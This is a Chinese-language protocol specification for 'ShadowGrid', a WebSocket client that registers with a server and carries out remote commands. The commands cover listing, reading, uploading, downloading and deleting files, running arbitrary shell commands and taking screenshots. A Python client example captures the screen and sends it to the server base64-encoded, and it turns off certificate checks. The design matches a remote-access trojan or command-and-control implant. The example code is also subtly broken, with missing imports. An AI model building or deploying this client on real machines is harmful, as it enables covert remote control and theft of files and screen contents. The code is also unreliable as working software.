# ShadowGrid 客户端协议文档

## 概述

客户端通过 WebSocket 与服务端通信，接收命令并返回结果。

**WebSocket URL**: `wss://your-server:8444/ws/{client_id}`

## 连接流程

```
┌─────────┐         ┌─────────┐         ┌─────────┐
│ Client  │────────>│ Server  │────────>│ Register  │
│         │         │         │         │ (5s wait) │
└─────────┘         └─────────┘         └─────────┘
        │                     │
        │                     │
        │<────────────────────│  Command
        │                     │
        │────────────────────>│  Result
        │                     │
        │<────────────────────│  Next Command
        │                     │
        └─────────────────────┘  (loop)
```

## 消息格式

所有消息均为 JSON 格式。

### 1. 注册消息 (客户端 → 服务端)

**必须在连接后 5 秒内发送**

```json
{
  "type": "register",
  "client_id": "abc12345",
  "hostname": "DESKTOP-ABC",
  "unique_id": "unique-client-id"
}
```

字段说明:
- `type`: "register"
- `client_id`: 客户端ID (建议使用 UUID)
- `hostname`: 客户端主机名
- `unique_id`: 客户端唯一标识 (用于重复连接检测)

---

### 2. 命令消息 (服务端 → 客户端)

```json
{
  "type": "command",
  "id": "cmd-1709280000000",
  "payload": {
    "type": "ls",
    "payload": "/home/user"
  }
}
```

字段说明:
- `type`: "command"
- `id`: 命令唯一ID (字符串，格式: `cmd-{timestamp}`)
- `payload`: 命令数据对象

---

### 3. 结果消息 (客户端 → 服务端)

```json
{
  "type": "result",
  "command_id": "cmd-1709280000000",
  "result": {
    "status": "ok",
    "result": "目录内容",
    "result_type": "list"
  }
}
```

字段说明:
- `type`: "result"
- `command_id`: 对应的命令ID
- `result`: 命令执行结果对象

---

## 命令类型

### ls / dir - 列出目录

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "ls", "payload": "/path"}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": [
    {"name": "file1.txt", "dir": false},
    {"name": "folder", "dir": true}
  ],
  "result_type": "list"
}
```

---

### cd - 切换目录

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "cd", "payload": "/home/user"}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "/home/user",
  "result_type": "dir"
}
```

---

### pwd - 显示当前目录

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "pwd", "payload": null}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "/home/user",
  "result_type": "dir"
}
```

---

### cat - 查看文件内容

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "cat", "payload": "/path/to/file.txt"}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "Base64编码的文件内容...",
  "filename": "file.txt",
  "result_type": "file"
}
```

---

### dl - 下载文件

**服务端发送**:
```json
{
  "type": "command",
  "payload": {
    "type": "dl",
    "payload": {"path": "/path/to/file.txt", "save_as": "newname.txt"}
  }
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "Base64编码的文件内容...",
  "filename": "newname.txt",
  "result_type": "file"
}
```

---

### ud - 上传文件

**服务端发送**:
```json
{
  "type": "command",
  "payload": {
    "type": "ud",
    "payload": {
      "base64_data": "Base64编码的文件内容...",
      "save_as": "/path/to/save.txt"
    }
  }
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "File saved successfully",
  "result_type": "ok"
}
```

---

### rm - 删除文件/目录

**服务端发送**:
```json
{
  "type": "command",
  "payload": {
    "type": "rm",
    "payload": {"path": "/path/to/delete", "recursive": true}
  }
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "Deleted successfully",
  "result_type": "ok"
}
```

---

### mv - 移动/重命名

**服务端发送**:
```json
{
  "type": "command",
  "payload": {
    "type": "mv",
    "payload": {"from_path": "/old/path", "to_path": "/new/path"}
  }
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "Moved/renamed successfully",
  "result_type": "ok"
}
```

---

### file - 查看文件类型

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "file", "payload": "/path/to/file"}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "text",
  "result_type": "file"
}
```

支持的类型: `text`, `executable`, `image`, `pdf`, `audio`, `video`, `archive`, `directory`, `shortcut`, `unknown`

---

### find - 查找文件

**服务端发送**:
```json
{
  "type": "command",
  "payload": {
    "type": "find",
    "payload": {
      "path": "/start/path",
      "name": "*.log",
      "type": "f"
    }
  }
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": [
    {"path": "/start/path/file.log", "type": "file"},
    {"path": "/start/subdir/file2.log", "type": "file"}
  ],
  "result_type": "list"
}
```

---

### shell - 执行系统命令

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "shell", "payload": "ls -la"}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "命令输出结果...",
  "result_type": "shell"
}
```

---

### screenshot - 截取屏幕

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "screenshot", "payload": null}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "Base64编码的PNG图片...",
  "filename": "shot.png",
  "result_type": "screenshot"
}
```

---

### echo - 回显测试

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "echo", "payload": "Hello"}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "Hello",
  "result_type": "echo"
}
```

---

### time - 获取时间

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "time", "payload": null}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "2026-03-01 10:30:00",
  "result_type": "time"
}
```

---

### test - 测试连接

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "test", "payload": null}
}
```

**客户端返回**:
```json
{
  "status": "ok",
  "result": "OK",
  "result_type": "test"
}
```

---

## 错误处理

### 路径错误

```json
{
  "status": "error",
  "result": "Invalid path",
  "result_type": "error"
}
```

### 文件不存在

```json
{
  "status": "error",
  "result": "File not found",
  "result_type": "error"
}
```

### 模块 unavailable

```json
{
  "status": "error",
  "result": "ImageGrab module not available",
  "result_type": "error"
}
```

---

## 心跳和超时

- 客户端连接后必须在 **5秒** 内发送 register 消息
- 服务端每 **0.5秒** 检查一次 pending 命令
- 客户端应保持连接活跃，避免 WebSocket 超时断开

---

## 完整示例 (Python)

```python
import websocket
import json
import time
import base64
from PIL import ImageGrab

def on_message(ws, message):
    msg = json.loads(message)
    
    if msg["type"] == "command":
        cmd = msg["payload"]
        result = handle_command(cmd, msg["id"])
        ws.send(json.dumps(result))

def on_open(ws):
    ws.send(json.dumps({
        "type": "register",
        "client_id": "client-123",
        "hostname": "my-host",
        "unique_id": "unique-id"
    }))

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print(f"Closed: {close_status_code} - {close_msg}")

def handle_command(cmd, cmd_id):
    cmd_type = cmd.get("type")
    payload = cmd.get("payload")
    
    try:
        if cmd_type == "ls":
            import os
            path = payload or "."
            items = [
                {"name": f, "dir": os.path.isdir(os.path.join(path, f))}
                for f in os.listdir(path)
            ]
            return {
                "type": "result",
                "command_id": cmd_id,
                "result": {
                    "status": "ok",
                    "result": items,
                    "result_type": "list"
                }
            }
        
        elif cmd_type == "screenshot":
            img = ImageGrab.grab()
            import tempfile
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
                img.save(f.name)
                data = base64.b64encode(open(f.name, "rb").read()).decode()
            os.remove(f.name)
            return {
                "type": "result",
                "command_id": cmd_id,
                "result": {
                    "status": "ok",
                    "result": data,
                    "filename": "shot.png",
                    "result_type": "screenshot"
                }
            }
        
        elif cmd_type == "echo":
            return {
                "type": "result",
                "command_id": cmd_id,
                "result": {
                    "status": "ok",
                    "result": str(payload),
                    "result_type": "echo"
                }
            }
        
        else:
            return {
                "type": "result",
                "command_id": cmd_id,
                "result": {
                    "status": "error",
                    "result": f"Unknown command: {cmd_type}",
                    "result_type": "error"
                }
            }
    
    except Exception as e:
        return {
            "type": "result",
            "command_id": cmd_id,
            "result": {
                "status": "error",
                "result": str(e),
                "result_type": "error"
            }
        }

if __name__ == "__main__":
    ws = websocket.WebSocketApp(
        "wss://server:8444/ws/client-123",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```

---

## 路径安全说明

客户端应实施路径安全检查，防止路径遍历攻击：

1. 将所有路径转换为绝对路径
2. 限制在当前工作目录范围内
3. 检查是否尝试访问 `..` 或跨盘符

示例检查逻辑:

```python
def is_safe_path(base_path, requested_path):
    base_abs = os.path.abspath(base_path)
    requested_abs = os.path.abspath(requested_path)
    
    if requested_abs == base_abs:
        return True
    
    return requested_abs.startswith(base_abs + os.sep)
```

---

## 最佳实践

1. **保持连接**: 使用重连机制，连接断开后自动重连
2. **错误处理**: 每个命令都应捕获异常，返回清晰的错误信息
3. **日志记录**: 记录收到的命令和响应，便于调试
4. **超时处理**: 命令执行应设置超时 (建议30秒)
5. **内存管理**: 大文件传输使用分块，避免内存溢出
6. **SSL验证**: 生产环境应验证服务端证书

## 参考

- [SERVER_API.md](./SERVER_API.md) - 服务端 API 文档
- [COMMANDS.md](./COMMANDS.md) - 命令使用说明
